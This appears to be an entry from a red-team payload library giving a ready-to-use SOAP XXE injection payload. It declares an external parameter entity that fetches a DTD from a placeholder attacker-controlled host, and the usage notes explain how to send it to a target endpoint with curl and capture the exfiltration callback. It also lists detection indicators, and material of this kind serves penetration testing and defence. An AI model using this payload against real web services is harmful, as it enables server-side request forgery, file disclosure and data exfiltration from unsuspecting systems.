---
id: 972dfd91-623d-49f9-a704-30207254dab1
type: code
name: SOAP-XXE-External-Entity-Payload
language: xml
verified: true
created_at: '2023-04-06T03:56:44.592920+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xxe
  - soap
  - payload
  - xml
validated: true
---

# SOAP-XXE-External-Entity-Payload

## Code

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

## Description

This XML code snippet is a malicious payload designed for XXE injection within a SOAP message body. It defines an external parameter entity (%dtd) that references a remote DTD hosted on an attacker-controlled server (replace 'http://x.x.x.x:22/' with your URL). When processed by a vulnerable XML parser, it fetches the remote DTD, enabling out-of-band data exfiltration, SSRF, or further payload expansion (e.g., for file inclusion or RCE). The CDATA wrapper helps evade basic input filters. This is typically embedded in a full SOAP envelope for submission to web services.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://x.x.x.x:22/ | URL of the attacker-controlled server hosting the malicious DTD | http://192.168.1.100:80/ |

## Usage

Embed this snippet into a complete SOAP envelope (e.g., within <soap:Envelope><soap:Header>...</soap:Header><soap:Body>...</soap:Body></soap:Envelope>) and send via POST to the target SOAP endpoint using tools like curl. Set up a listener on your server (e.g., Python SimpleHTTPServer) to capture the exfiltration request. Use in red team scenarios to test XXE in SOAP services, confirming vulnerability by observing the incoming request to your server.

## Detection

- XML logs showing DOCTYPE declarations or external entity references.
- Network monitoring for outbound HTTP requests from the application server to unusual IPs/ports.
- WAF alerts on XML payloads with entity expansions.
- File access logs for reads of sensitive paths like /etc/passwd if local file inclusion is involved.

## Related

- [[procedures/XXE-Injection-in-SOAP-Messages]]
- [[commands/curl-send-soap-xxe]]
